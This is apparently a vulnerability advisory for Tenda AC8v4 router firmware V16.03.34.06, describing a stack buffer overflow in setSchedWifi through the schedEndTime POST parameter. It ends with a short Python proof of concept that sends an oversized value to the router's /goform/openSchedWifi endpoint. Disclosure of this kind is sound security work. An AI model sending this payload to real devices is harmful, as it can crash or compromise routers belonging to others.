# Tenda AC8v4 V16.03.34.06(2)

## Overview

- Firmware download website: https://www.tenda.com.cn/material/show/103518

## Affected version

V16.03.34.06

## Vulnerability details

The Tenda AC8v4 V16.03.34.06 firmware has a stack overflow vulnerability in the `setSchedWifi` function. The `v8` variable receives the `schedEndTime` parameter from a POST request and is later assigned to the `ptr+10` variable, which is fixed at 25 bytes. However, since the user can control the input of  `schedEndTime`, the statement `strcpy((char *)ptr + 10, v8);` can cause a buffer overflow. The user-provided  `schedEndTime` can exceed the capacity of the `dest` array, triggering this security vulnerability.

![1735652460255](F:\Desktop\工具\二进制漏洞\IoT\img\1735652460255.png)

![1735652484802](F:\Desktop\工具\二进制漏洞\IoT\img\1735652484802.png)

![1735652519036](F:\Desktop\工具\二进制漏洞\IoT\img\1735652519036.png)

## POC

```python
import requests

url = "http://192.168.1.100/goform/openSchedWifi"
data = {
        "schedEndTime":b'A'*1000
}
requests.post(url=url,data=data)
```

![1735650674572](F:\Desktop\工具\二进制漏洞\IoT\img\1735650674572.png)

